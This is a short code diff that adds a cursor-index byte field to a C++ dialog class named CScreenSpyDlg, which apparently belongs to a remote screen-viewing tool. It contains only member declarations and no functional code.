@@ -31,6 +31,7 @@ public:
 	HICON  m_hIcon;
 	HICON  m_hCursor;
 	POINT  m_ClientCursorPos;
+	BYTE m_bCursorIndex;
 	CString  m_strClientIP;
 	BOOL     m_bIsTraceCursor;
 	VOID CScreenSpyDlg::SendCommand(MSG* Msg);
